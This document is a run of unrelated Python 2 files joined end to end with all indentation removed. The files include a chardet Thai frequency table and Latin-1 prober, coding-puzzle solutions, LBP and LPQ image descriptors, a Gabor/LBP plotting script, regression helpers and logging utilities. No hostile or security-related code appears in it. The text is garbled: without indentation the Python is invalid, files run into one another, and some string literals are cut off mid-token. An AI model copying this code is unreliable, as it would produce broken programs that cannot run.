3,0,0,3,1,2,0,0,2,2,0,1,2,0,1,0,1,3,1,2,1,0,0,0,2,0,3,0,0,0,1,0,
0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,1,1,2,2,0,0,0,2,0,2,1,0,1,1,0,1,1,1,2,1,0,0,1,1,1,0,2,1,1,1,
0,1,1,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,1,
0,0,0,2,0,1,3,1,1,1,1,0,0,0,0,3,2,0,1,0,0,0,1,2,0,0,0,1,0,0,0,0,
0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,3,3,3,3,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,0,2,3,2,2,0,0,0,1,0,0,0,0,2,3,2,1,2,2,3,0,0,0,2,3,1,0,0,0,1,1,
0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,
3,3,2,2,0,1,0,0,0,0,2,0,2,0,1,0,0,0,1,1,0,0,0,2,1,0,1,0,1,1,0,0,
0,1,0,2,0,0,1,0,3,0,1,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,1,0,0,1,0,0,0,0,0,1,1,2,0,0,0,0,1,0,0,1,3,1,0,0,0,0,1,1,0,0,
0,1,0,0,0,0,3,0,0,0,0,0,0,3,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,
3,3,1,1,1,1,2,3,0,0,2,1,1,1,1,1,0,2,1,1,0,0,0,2,1,0,1,2,1,1,0,1,
2,1,0,3,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,3,1,0,0,0,0,0,0,0,3,0,0,0,3,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,
0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,3,2,0,0,0,0,0,0,1,2,1,0,1,1,0,2,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,2,0,0,0,1,3,0,1,0,0,0,2,0,0,0,0,0,0,0,1,2,0,0,0,0,0,
3,3,0,0,1,1,2,0,0,1,2,1,0,1,1,1,0,1,1,0,0,2,1,1,0,1,0,0,1,1,1,0,
0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,2,2,1,0,0,0,0,1,0,0,0,0,3,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,
2,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,3,0,0,1,1,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,1,0,1,2,0,1,2,0,0,1,1,0,2,0,1,0,0,1,0,0,0,0,1,0,0,0,2,0,0,0,0,
1,0,0,1,0,1,1,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,1,0,0,0,0,0,0,0,1,1,0,1,1,0,2,1,3,0,0,0,0,1,1,0,0,0,0,0,0,0,3,
1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,0,1,0,1,0,0,2,0,0,2,0,0,1,1,2,0,0,1,1,0,0,0,1,0,0,0,1,1,0,0,0,
1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,
1,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,1,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,0,0,0,0,2,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,3,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,
1,0,0,0,0,0,0,0,0,1,0,0,0,0,2,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,1,1,0,0,2,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
)
TIS620ThaiModel = {
'charToOrderMap': TIS620CharToOrderMap,
'precedenceMatrix': ThaiLangModel,
'mTypicalPositiveRatio': 0.926386,
'keepEnglishLetter': False,
'charsetName': "TIS-620"
}
class Solution:
def largestNumber(self, nums):
nums = map(str, nums)
nums.sort(cmp=self.cmp, reverse=True)
nums = "".join(nums)
nums = nums.lstrip("0")
if not nums:
nums = "0"
return nums
def cmp(self, a, b):
order = 1
if len(a) > len(b):
order = -1
a, b = b, a
for i in xrange(len(a)):
if int(a[i]) != int(b[i]):
return order*(int(a[i])-int(b[i]))
if len(a) == len(b):
return 0
return order*self.cmp(a, b[len(a):])
if __name__ == "__main__":
assert Solution().largestNumber([0, 0]) == "0"
assert Solution().largestNumber([1, 20, 23, 4, 8]) == "8423201
class Solution(object):
def solve(self, cipher):
N, K, lst = cipher
for i in xrange(len(lst)):
if K <= 0:
break
maxa, idx = -1, 0
for j in xrange(i, len(lst)):
if lst[j] > maxa:
maxa = lst[j]
idx = j
if idx != i:
K -= 1
lst[idx], lst[i] = lst[i], lst[idx]
return " ".join(map(str, lst))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
N, K = map(int, f.readline().strip().split(' '))
lst = map(int, f.readline().strip().split(' '))
cipher = (N, K, lst)
s = "%s\n" % (solution.solve(cipher))
print s,
from .charsetprober import CharSetProber
from .constants import eNotMe
from .compat import wrap_ord
FREQ_CAT_NUM = 4
UDF = 0
OTH = 1
ASC = 2
ASS = 3
ACV = 4
ACO = 5
ASV = 6
ASO = 7
CLASS_NUM = 8
Latin1_CharToClass = (
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, ASC, ASC, ASC, ASC, ASC, ASC, ASC,
ASC, ASC, ASC, ASC, ASC, ASC, ASC, ASC,
ASC, ASC, ASC, ASC, ASC, ASC, ASC, ASC,
ASC, ASC, ASC, OTH, OTH, OTH, OTH, OTH,
OTH, ASS, ASS, ASS, ASS, ASS, ASS, ASS,
ASS, ASS, ASS, ASS, ASS, ASS, ASS, ASS,
ASS, ASS, ASS, ASS, ASS, ASS, ASS, ASS,
ASS, ASS, ASS, OTH, OTH, OTH, OTH, OTH,
OTH, UDF, OTH, ASO, OTH, OTH, OTH, OTH,
OTH, OTH, ACO, OTH, ACO, UDF, ACO, UDF,
UDF, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, ASO, OTH, ASO, UDF, ASO, ACO,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
OTH, OTH, OTH, OTH, OTH, OTH, OTH, OTH,
ACV, ACV, ACV, ACV, ACV, ACV, ACO, ACO,
ACV, ACV, ACV, ACV, ACV, ACV, ACV, ACV,
ACO, ACO, ACV, ACV, ACV, ACV, ACV, OTH,
ACV, ACV, ACV, ACV, ACV, ACO, ACO, ACO,
ASV, ASV, ASV, ASV, ASV, ASV, ASO, ASO,
ASV, ASV, ASV, ASV, ASV, ASV, ASV, ASV,
ASO, ASO, ASV, ASV, ASV, ASV, ASV, OTH,
ASV, ASV, ASV, ASV, ASV, ASO, ASO, ASO,
)
Latin1ClassModel = (
0,  0,  0,  0,  0,  0,  0,  0,
0,  3,  3,  3,  3,  3,  3,  3,
0,  3,  3,  3,  3,  3,  3,  3,
0,  3,  3,  3,  1,  1,  3,  3,
0,  3,  3,  3,  1,  2,  1,  2,
0,  3,  3,  3,  3,  3,  3,  3,
0,  3,  1,  3,  1,  1,  1,  3,
0,  3,  1,  3,  1,  1,  3,  3,
)
class Latin1Prober(CharSetProber):
def __init__(self):
CharSetProber.__init__(self)
self.reset()
def reset(self):
self._mLastCharClass = OTH
self._mFreqCounter = [0] * FREQ_CAT_NUM
CharSetProber.reset(self)
def get_charset_name(self):
return "windows-1252"
def feed(self, aBuf):
aBuf = self.filter_with_english_letters(aBuf)
for c in aBuf:
charClass = Latin1_CharToClass[wrap_ord(c)]
freq = Latin1ClassModel[(self._mLastCharClass * CLASS_NUM)
+ charClass]
if freq == 0:
self._mState = eNotMe
break
self._mFreqCounter[freq] += 1
self._mLastCharClass = charClass
return self.get_state()
def get_confidence(self):
if self.get_state() == eNotMe:
return 0.01
total = sum(self._mFreqCounter)
if total < 0.01:
confidence = 0.0
else:
confidence = ((self._mFreqCounter[3] / total)
- (self._mFreqCounter[1] * 20.0 / total))
if confidence < 0.0:
confidence = 0.0
confidence = confidence * 0.5
return confidence
import numpy as np
from scipy.signal import convolve2d
class LocalDescriptor(object):
def __init__(self, neighbors):
self._neighbors = neighbors
def __call__(self,X):
raise NotImplementedError("Every LBPOperator must implement the __call__ method.")
@property
def neighbors(self):
return self._neighbors
def __repr__(self):
return "LBPOperator (neighbors=%s)" % self._neighbors
def short_name(self):
return "LBPOperator"
class OriginalLBP(LocalDescriptor):
def __init__(self):
LocalDescriptor.__init__(self, 8)
def __call__(self, X):
X = np.asarray(X)
X = (1<<7) * (X[0:-2,0:-2] >= X[1:-1,1:-1]) \
+ (1<<6) * (X[0:-2,1:-1] >= X[1:-1,1:-1]) \
+ (1<<5) * (X[0:-2,2:] >= X[1:-1,1:-1]) \
+ (1<<4) * (X[1:-1,2:] >= X[1:-1,1:-1]) \
+ (1<<3) * (X[2:,2:] >= X[1:-1,1:-1]) \
+ (1<<2) * (X[2:,1:-1] >= X[1:-1,1:-1]) \
+ (1<<1) * (X[2:,:-2] >= X[1:-1,1:-1]) \
+ (1<<0) * (X[1:-1,:-2] >= X[1:-1,1:-1])
return X
def __repr__(self):
return "OriginalLBP (neighbors=%s)" % self._neighbors
def short_name(self):
return "OriginalLBP"
class ExtendedLBP(LocalDescriptor):
def __init__(self, radius=1, neighbors=8):
LocalDescriptor.__init__(self, neighbors)
self._radius = radius
def __call__(self, X):
X = np.asanyarray(X)
ysize, xsize = X.shape
angles = 2*np.pi/self._neighbors
theta = np.arange(0, 2*np.pi, angles)
sample_points = np.array([-np.sin(theta), np.cos(theta)]).T
sample_points *= self._radius
miny=min(sample_points[:,0])
maxy=max(sample_points[:,0])
minx=min(sample_points[:,1])
maxx=max(sample_points[:,1])
blocksizey = np.ceil(max(maxy,0)) - np.floor(min(miny,0)) + 1
blocksizex = np.ceil(max(maxx,0)) - np.floor(min(minx,0)) + 1
origy = 0 - np.floor(min(miny,0))
origx = 0 - np.floor(min(minx,0))
dx = xsize - blocksizex + 1
dy = ysize - blocksizey + 1
C = np.asarray(X[origy:origy+dy,origx:origx+dx], dtype=np.uint8)
result = np.zeros((dy,dx), dtype=np.uint32)
for i, p in enumerate(sample_points):
y,x = p + (origy, origx)
fx = np.floor(x)
fy = np.floor(y)
cx = np.ceil(x)
cy = np.ceil(y)
ty = y - fy
tx = x - fx
w1 = (1 - tx) * (1 - ty)
w2 =      tx  * (1 - ty)
w3 = (1 - tx) *      ty
w4 =      tx  *      ty
N = w1*X[fy:fy+dy,fx:fx+dx]
N += w2*X[fy:fy+dy,cx:cx+dx]
N += w3*X[cy:cy+dy,fx:fx+dx]
N += w4*X[cy:cy+dy,cx:cx+dx]
D = N >= C
result += (1<<i)*D
return result
@property
def radius(self):
return self._radius
def __repr__(self):
return "ExtendedLBP (neighbors=%s, radius=%s)" % (self._neighbors, self._radius)
def short_name(self):
return "ExtendedLBP"
class VarLBP(LocalDescriptor):
def __init__(self, radius=1, neighbors=8):
LocalDescriptor.__init__(self, neighbors)
self._radius = radius
def __call__(self,X):
X = np.asanyarray(X)
ysize, xsize = X.shape
angles = 2*np.pi/self._neighbors
theta = np.arange(0,2*np.pi,angles)
sample_points = np.array([-np.sin(theta), np.cos(theta)]).T
sample_points *= self._radius
miny=min(sample_points[:,0])
maxy=max(sample_points[:,0])
minx=min(sample_points[:,1])
maxx=max(sample_points[:,1])
blocksizey = np.ceil(max(maxy,0)) - np.floor(min(miny,0)) + 1
blocksizex = np.ceil(max(maxx,0)) - np.floor(min(minx,0)) + 1
origy =  0 - np.floor(min(miny,0))
origx =  0 - np.floor(min(minx,0))
dx = xsize - blocksizex + 1
dy = ysize - blocksizey + 1
mean = np.zeros((dy,dx), dtype=np.float32)
delta = np.zeros((dy,dx), dtype=np.float32)
m2 = np.zeros((dy,dx), dtype=np.float32)
result = np.zeros((dy,dx), dtype=np.float32)
for i,p in enumerate(sample_points):
y,x = p + (origy, origx)
fx = np.floor(x)
fy = np.floor(y)
cx = np.ceil(x)
cy = np.ceil(y)
ty = y - fy
tx = x - fx
w1 = (1 - tx) * (1 - ty)
w2 =      tx  * (1 - ty)
w3 = (1 - tx) *      ty
w4 =      tx  *      ty
N = w1*X[fy:fy+dy,fx:fx+dx]
N += w2*X[fy:fy+dy,cx:cx+dx]
N += w3*X[cy:cy+dy,fx:fx+dx]
N += w4*X[cy:cy+dy,cx:cx+dx]
delta = N - mean
mean = mean + delta/float(i+1)
m2 = m2 + delta * (N-mean)
result = m2/(self._neighbors-1)
return result
@property
def radius(self):
return self._radius
def __repr__(self):
return "VarLBP (neighbors=%s, radius=%s)" % (self._neighbors, self._radius)
def short_name(self):
return "VarLBP"
class LPQ(LocalDescriptor):
def __init__(self, radius=3):
LocalDescriptor.__init__(self, 8)
self._radius = radius
def euc_dist(self, X):
Y = X = X.astype(np.float)
XX = np.sum(X * X, axis=1)[:, np.newaxis]
YY = XX.T
distances = np.dot(X,Y.T)
distances *= -2
distances += XX
distances += YY
np.maximum(distances, 0, distances)
distances.flat[::distances.shape[0] + 1] = 0.0
return np.sqrt(distances)
def __call__(self,X):
f = 1.0
x = np.arange(-self._radius,self._radius+1)
n = len(x)
rho = 0.95
[xp, yp] = np.meshgrid(np.arange(1,(n+1)),np.arange(1,(n+1)))
pp = np.concatenate((xp,yp)).reshape(2,-1)
dd = self.euc_dist(pp.T)
C = np.power(rho,dd)
w0 = (x*0.0+1.0)
w1 = np.exp(-2*np.pi*1j*x*f/n)
w2 = np.conj(w1)
q1 = w0.reshape(-1,1)*w1
q2 = w1.reshape(-1,1)*w0
q3 = w1.reshape(-1,1)*w1
q4 = w1.reshape(-1,1)*w2
u1 = np.real(q1)
u2 = np.imag(q1)
u3 = np.real(q2)
u4 = np.imag(q2)
u5 = np.real(q3)
u6 = np.imag(q3)
u7 = np.real(q4)
u8 = np.imag(q4)
M = np.matrix([u1.flatten(1), u2.flatten(1), u3.flatten(1), u4.flatten(1), u5.flatten(1), u6.flatten(1), u7.flatten(1), u8.flatten(1)])
D = np.dot(np.dot(M,C), M.T)
U,S,V = np.linalg.svd(D)
Qa = convolve2d(convolve2d(X,w0.reshape(-1,1),mode='same'),w1.reshape(1,-1),mode='same')
Qb = convolve2d(convolve2d(X,w1.reshape(-1,1),mode='same'),w0.reshape(1,-1),mode='same')
Qc = convolve2d(convolve2d(X,w1.reshape(-1,1),mode='same'),w1.reshape(1,-1),mode='same')
Qd = convolve2d(convolve2d(X, w1.reshape(-1,1),mode='same'),w2.reshape(1,-1),mode='same')
Fa = np.real(Qa)
Ga = np.imag(Qa)
Fb = np.real(Qb)
Gb = np.imag(Qb)
Fc = np.real(Qc)
Gc = np.imag(Qc)
Fd = np.real(Qd)
Gd = np.imag(Qd)
F = np.array([Fa.flatten(1), Ga.flatten(1), Fb.flatten(1), Gb.flatten(1), Fc.flatten(1), Gc.flatten(1), Fd.flatten(1), Gd.flatten(1)])
G = np.dot(V.T, F)
t = 0
B = (G[0,:]>=t)*1 + (G[1,:]>=t)*2 + (G[2,:]>=t)*4 + (G[3,:]>=t)*8 + (G[4,:]>=t)*16 + (G[5,:]>=t)*32 + (G[6,:]>=t)*64 + (G[7,:]>=t)*128
return np.reshape(B, np.shape(Fa))
@property
def radius(self):
return self._radius
def __repr__(self):
return "LPQ (neighbors=%s, radius=%s)" % (self._neighbors, self._radius)
def short_name(self):
return "LPQ
import sys
import cv2
import numpy as np
from expr.feature import GaborFilterCv2
from expr.read_dataset import read_images
from facerec_py.facerec.lbp import ExtendedLBP, OriginalLBP
from facerec_py.facerec.preprocessing import LBPPreprocessing
import matplotlib.pyplot as plt
class LbpIntermidiate(object):
def __init__(self, lbp=OriginalLBP()):
self.X, self.y = self.read()
self.lbp = lbp
def read(self):
if len(sys.argv) < 2:
print "USAGE: experiment_setup.py </path/to/images>"
sys.exit()
X, y = read_images(sys.argv[1])
X = np.asarray(X)
y = np.asarray(y)
return X, y
def draw(self):
org_imgs = reduce(self.hstack, self.X)
lbp_imgs = reduce(self.hstack, map(self.lbp_filter, self.X))
cv2.imshow("original", org_imgs)
cv2.imshow("lbp", lbp_imgs)
cv2.waitKey(0)
cv2.destroyAllWindows()
def hstack(self, x, y):
return np.hstack((x, y))
def lbp_filter(self, x):
return self.lbp(x).astype(np.uint8)
class GaborLbpIntermidiate(LbpIntermidiate):
def __init__(self):
super(GaborLbpIntermidiate, self).__init__()
self.sz = (16, 16)
self.py = 0
self.px = 0
def square(self, X, row, col):
for x in X:
x[row * self.py, col * self.px:(col + 1) * self.px] = 255
x[(row + 1) * self.py, col * self.px:(col + 1) * self.px] = 255
x[row * self.py:(row + 1) * self.py, col * self.px] = 255
x[row * self.py:(row + 1) * self.py, (col + 1) * self.px] = 255
return X
def gabor_filter(self, x, idx=34):
gabor = GaborFilterCv2(8, 5)
return cv2.filter2D(x, cv2.CV_8UC3, gabor._kernels[idx])
def draw(self, title, row=12, col=3, gabor_filter=lambda x: x, lbp_filter=lambda x: x):
imgs_procssed = map(lbp_filter, map(gabor_filter, self.X))
hists = []
for i in imgs_procssed:
hists.append(self.histogram(i, row, col))
cv2.imshow("original", reduce(self.hstack, self.square(self.X, row, col)))
plt.subplot()
plt.title(title)
plt.ylabel("Number of Pixels")
plt.xlabel("Gray Level")
lines = []
for idx, hist in enumerate(hists):
line, = plt.plot(range(len(hist)), hist, label="image-%d" % (idx + 1))
lines.append(line)
plt.legend(handles=lines)
plt.show()
def run(self):
self.draw("Original")
self.draw("LBP", lbp_filter=self.lbp_filter)
self.draw("Gabor Magnitude", gabor_filter=lambda x: self.gabor_filter(x, 12))
self.draw("LGBP", lbp_filter=self.lbp_filter, gabor_filter=self.gabor_filter)
def histogram(self, L, row, col):
lbp_height, lbp_width = L.shape
grid_rows, grid_cols = self.sz
self.py = int(np.floor(lbp_height / grid_rows))
self.px = int(np.floor(lbp_width / grid_cols))
C = L[row * self.py:(row + 1) * self.py, col * self.px:(col + 1) * self.px]
H = np.histogram(C,
bins=16,
range=(0, 2 ** self.lbp.neighbors),
weights=None,
normed=False
)[0]
return np.asarray(H)
if __name__ == "__main__":
print __file__
GaborLbpIntermidiate().run()
MOD = 1000000007
class Solution(object):
def __init__(self):
self.lens = [1, 2, 3, 4]
def solve(self, cipher):
N, M = cipher
f = [0 for _ in xrange(M + 1)]
s = [0 for _ in xrange(M + 1)]
f[0] = 1
for j in xrange(1, M + 1):
for l in self.lens:
if j - l >= 0:
f[j] += f[j - l]
f[j] %= MOD
f_N = map(lambda x: pow(x, N, MOD), f)
for j in xrange(1, M + 1):
s[j] = f_N[j]
if s[j] <= 0: break
for k in xrange(1, j):
s[j] -= f_N[j - k] * s[k]
s[j] %= MOD
return s[M]
class Solution_TLE(object):
def __init__(self):
self.lens = [1, 2, 3, 4]
def solve(self, cipher):
N, M = cipher
f = [[0 for _ in xrange(M + 1)] for _ in xrange(N + 1)]
s = [[0 for _ in xrange(M + 1)] for _ in xrange(N + 1)]
f[1][0] = 1
for j in xrange(1, M + 1):
for l in self.lens:
if j - l >= 0:
f[1][j] += f[1][j - l]
f[1][j] %= MOD
for i in xrange(2, N + 1):
for j in xrange(1, M + 1):
f[i][j] = f[i - 1][j] * f[1][j]
f[i][j] %= MOD
for i in xrange(1, N + 1):
for j in xrange(1, M + 1):
s[i][j] = f[i][j]
if s[i][j] <= 0: break
for k in xrange(1, j):
s[i][j] -= f[i][j - k] * s[i][k]
s[i][j] %= MOD
return s[N][M]
def solve_error(self, cipher):
N, M = cipher
f = [[0 for _ in xrange(M + 1)] for _ in xrange(N + 1)]
f[1][1] = 1
for j in xrange(1, M + 1):
for l in self.lens:
if j - l >= 1:
f[1][j] += f[1][j - l]
for j in xrange(1, M + 1):
f[1][j] -= f[1][j - 1]
for i in xrange(2, N + 1):
for j in xrange(1, M + 1):
cmb = i
for l in xrange(1, i + 1):
f[i][j] += cmb * f[i - l][j - 1] * (f[1][j] ** i)
cmb = cmb * (i - l) / (l + 1)
return f[N][M]
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
import numpy as np
class Predictor(object):
def linear_regression(self, mat_X, vec_Y):
mat_A = np.dot(mat_X, mat_X.T)
vec_b = np.dot(mat_X, vec_Y.T)
vec_w = np.dot(np.linalg.inv(mat_A), vec_b)
return vec_w
def predict(self, vec_w, mat_X):
vec_Y_predicted = np.dot(vec_w.T, mat_X)
return vec_Y_predicted
class Solution(object):
def solve(self, cipher):
l = 1
h = cipher
while l <= h:
mid = (l + h) / 2
if self.sum_of_squares(mid) <= cipher:
l = mid + 1
else:
h = mid - 1
l -= 1
return l
def sum_of_squares(self, n):
return n * (n + 1) * (2 * n + 1) / 6
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = int(f.readline().strip())
s = "%s\n" % (Solution().solve(cipher))
print s,
import logging
import sys
class LoggerFactory(object):
def getConsoleLogger(self, cls_name, level=logging.DEBUG):
lgr = logging.getLogger(cls_name)
lgr.setLevel(level)
if not lgr.handlers:
ch = logging.StreamHandler(sys.stdout)
ch.setLevel(level)
ch.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
lgr.addHandler(ch)
return lgr
import numpy as np
from scipy.stats import logistic
import matplotlib.pyplot as plt
class LogisticRegressioner(object):
def __init__(self, tol=1e-6):
self.tol = tol
def first_derivative(self, X, Y, w):
d, T = X.shape
sigma = logistic.cdf(np.multiply(-Y, np.dot(w.T, X)))
ret = np.multiply(sigma, Y)
ret = np.multiply(np.repeat(ret[np.newaxis, :], d, axis=0), X)
ret = np.sum(ret, axis=1)
return ret
def log_loss(self, X, Y, w):
L = np.log(logistic.cdf(np.multiply(Y, np.dot(w.T, X))))
L = np.sum(L)
L = -L
return L
def classifier_w(self, X, Y,eta=0.05):
X = X.T
d, T = X.shape
X = np.vstack([np.ones((T, )), X])
d += 1
w = np.zeros(d)
t = 0
while True:
t += 1
w_ = w + eta*self.first_derivative(X, Y, w)
L_old, L_new = self.log_loss(X, Y, w_), self.log_loss(X, Y, w)
if np.abs(L_old - L_new) < self.tol: break
w = w_
if t % 300 == 1: yield w
yield w
def test_sample(self):
X = np.array([
[2, 1],
[1, 20],
[1, 5],
[4, 1],
[1, 40],
[3, 30],
])
Y = np.array([
-1,
-1,
-1,
1,
1,
1,
])
ws = list(self.classifier_w(X, Y))
print ws[-1]
from contextlib import contextmanager
import logging
@contextmanager
def debug_logging(level):
logger = logging.getLogger()
old_level = logger.getEffectiveLevel()
logger.setLevel(level)
try:
yield
finally:
logger.setLevel(old_level)
@contextmanager
def log_level(level, name):
logger = logging.getLogger(name)
old_level = logger.getEffectiveLevel()
logger.setLevel(level)
try:
yield logger
finally:
logger.setLevel(old_level)
class Solution(object):
def solve(self, cipher):
A = cipher
bit = 0
for item in A:
bit ^= item
return bit
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution:
def longestCommonSubsequence(self, A, B):
m = len(A)
n = len(B)
f = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
if m == 0 or n == 0:
return 0
for i in xrange(1, m+1):
for j in xrange(1, n+1):
if A[i-1] == B[j-1]:
f[i][j] = f[i-1][j-1]+1
else:
f[i][j] = max(f[i][j-1], f[i-1][j])
return f[-1][-1]
class Solution:
def longestCommonSubstring(self, A, B):
m = len(A)
n = len(B)
f = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
if m == 0 or n == 0:
return 0
maxa = -1
for i in xrange(1, m+1):
for j in xrange(1, n+1):
if A[i-1] == B[j-1]:
f[i][j] = f[i-1][j-1]+1
else:
f[i][j] = 0
maxa = max(maxa, f[i][j])
return maxa
class Solution:
def longestIncreasingContinuousSubsequence(self, A):
n = len(A)
if n < 1:
return 0
maxa = 1
cur = 1
for i in xrange(1, n):
if A[i] > A[i-1]:
cur += 1
maxa = max(maxa, cur)
else:
cur = 1
cur = 1
for i in xrange(1, n):
if A[n-1-i] > A[n-1-i+1]:
cur += 1
maxa = max(maxa, cur)
else:
cur = 1
return maxa
class Solution:
def longestIncreasingSubsequence(self, nums):
n = len(nums)
if n == 0:
return 0
maxa = 1
f = [1 for _ in xrange(n)]
for i in xrange(n):
for j in xrange(i):
if nums[i] >= nums[j]:
f[i] = max(f[i], f[j]+1)
maxa = max(maxa, f[i])
return maxa
if __name__ == "__main__":
assert Solution().longestIncreasingSubsequence(
[88, 4, 24, 82, 86, 1, 56, 74, 71, 9, 8, 18, 26, 53, 77, 87, 60, 27, 69, 17, 76, 23, 67, 14, 98, 13, 10, 83, 20,
43, 39, 29, 92, 31, 0, 30, 90, 70, 37, 59]) == 10
class Solution:
def longestPalindrome(self, s):
n = len(s)
pa = [[False for _ in xrange(n+1)] for _ in xrange(n)]
for i in xrange(n):
pa[i][i] = True
pa[i][i+1] = True
maxa = (0, 1)
for i in xrange(n-2, -1, -1):
for j in xrange(i+2, n+1):
pa[i][j] = pa[i+1][j-1] and s[i] == s[j-1]
if pa[i][j] and j-i > maxa[1]-maxa[0]:
maxa = (i, j)
return s[maxa[0]:maxa[1]]
if __name__ == "__main__":
assert Solution().longestPalindrome("abcdzdcab") == "cdzdc"
class Solution:
def lengthOfLongestSubstringKDistinct(self, s, k):
if len(s)<1 or k<1:
return 0
cnt = {}
b = 0
e = 1
cnt[s[b]] = 1
maxa = 1
while e<len(s):
if s[e] not in cnt:
cnt[s[e]] = 0
cnt[s[e]] += 1
e += 1
while len(cnt)>k:
cnt[s[b]] -= 1
if cnt[s[b]]<=0:
del cnt[s[b]]
b += 1
maxa = max(maxa, e-b)
